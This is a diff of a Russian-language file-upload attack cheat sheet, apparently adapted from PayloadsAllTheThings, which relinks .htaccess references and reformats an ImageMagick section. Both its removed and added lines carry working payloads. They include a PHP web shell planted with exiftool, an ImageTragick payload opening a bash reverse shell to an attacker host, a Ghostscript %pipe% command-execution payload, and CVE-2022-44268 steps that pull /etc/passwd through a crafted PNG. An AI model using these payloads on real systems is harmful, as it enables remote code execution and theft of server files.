@@ -320,12 +320,12 @@ exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __h
 
 Если пытаешься загрузить файлы на:
 
-* PHP сервер, посмотри на трюк с [.htaccess](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess) для выполнения кода.
+* PHP сервер, посмотри на трюк с [.htaccess](https://github.com/Kaupervud69/WebVuln/tree/main/File%20upload/Apache%20.htaccess%20config) для выполнения кода.
 * ASP сервер, посмотри на трюк с [web.config для](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config) выполнения кода.
 * uWSGI сервер, посмотри на трюк с [uwsgi.ini](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20uwsgi.ini/uwsgi.ini) для выполнения кода.
 
 * Примеры файлов конфигурации
-   * Apache: [.htaccess](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess)
+   * Apache: [.htaccess](https://github.com/Kaupervud69/WebVuln/tree/main/File%20upload/Apache%20.htaccess%20config)
    * IIS: [web.config](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config)
    * Python: [__init__.py](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20Python%20__init__.py/python-generate-init.py)
    * WSGI: [uwsgi.ini](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20uwsgi.ini/uwsgi.ini)
@@ -389,20 +389,21 @@ characters = @(call://uwsgi_func)
 
 ## CVE - ImageMagick
 
-Если бэкенд использует ImageMagick для изменения размера/конвертации пользовательских изображений, вы можете попробовать эксплуатировать известные уязвимости, такие как ImageTragik.
-CVE-2016–3714 - ImageTragik
+> Если бэкенд использует ImageMagick для изменения размера/конвертации пользовательских изображений, вы можете попробовать эксплуатировать известные уязвимости, такие как ImageTragik.
+
+**CVE-2016–3714 - ImageTragik**
 
 Загрузите это содержимое с расширением изображения, чтобы эксплуатировать уязвимость (ImageMagick , 7.0.1-1)
 
-    ImageTragik - пример #1
-
-    push graphic-context
-    viewbox 0 0 640 480
-    fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
-    pop graphic-context
-
-ImageTragik - пример #3
-
+* ImageTragik - пример #1
+```python
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
+pop graphic-context
+```
+* ImageTragik - пример #2
+```python
 %!PS
 userdict /setpagedevice undef
 save
@@ -411,27 +412,30 @@ legal
 { legal } stopped { pop } if
 restore
 mark /OutputFile (%pipe%id) currentdevice putdeviceprops
+```
 
-Уязвимость может быть вызвана с помощью команды convert.
-
+Уязвимость может быть вызвана с помощью команды ```convert```.
+```
 convert shellexec.jpeg whatever.gif
+```
 
-CVE-2022-44268
+**CVE-2022-44268**
 
-CVE-2022-44268 - это уязвимость раскрытия информации, обнаруженная в ImageMagick. Злоумышленник может эксплуатировать это, создав вредоносный файл изображения, который при обработке ImageMagick может раскрыть информацию из локальной файловой системы сервера, на котором работает уязвимая версия программного обеспечения.
+> CVE-2022-44268 - это уязвимость раскрытия информации, обнаруженная в ImageMagick. Пользователь может эксплуатировать это, создав вредоносный файл изображения, который при обработке ImageMagick может раскрыть информацию из локальной файловой системы сервера, на котором работает уязвимая версия программного обеспечения.
 
-    Сгенерируйте полезную нагрузку
+* Сгенерируйте полезную нагрузку
+```
+apt-get install pngcrush imagemagick exiftool exiv2 -y
+pngcrush -text a "profile" "/etc/passwd" exploit.png
+```
+* Вызовите эксплойт, загрузив файл. Бэкенд может использовать что-то вроде convert pngout.png pngconverted.png
 
-    apt-get install pngcrush imagemagick exiftool exiv2 -y
-    pngcrush -text a "profile" "/etc/passwd" exploit.png
+* Скачайте преобразованное изображение и проверьте его содержимое с помощью: identify -verbose pngconverted.png
 
-    Вызовите эксплойт, загрузив файл. Бэкенд может использовать что-то вроде convert pngout.png pngconverted.png
-
-    Скачайте преобразованное изображение и проверьте его содержимое с помощью: identify -verbose pngconverted.png
-
-    Преобразуйте эксфильтрованные данные: python3 -c 'print(bytes.fromhex("HEX_FROM_FILE").decode("utf-8"))'
+* Преобразуйте эксфильтрованные данные: python3 -c 'print(bytes.fromhex("HEX_FROM_FILE").decode("utf-8"))'
 
 Больше полезных нагрузок в папке Picture ImageMagick/.
+
 ### CVE - FFMpeg HLS
 
 FFmpeg - это открытое программное обеспечение, используемое для обработки аудио и видео форматов. Вы можете использовать вредоносный плейлист HLS внутри видео AVI для чтения произвольных файлов.
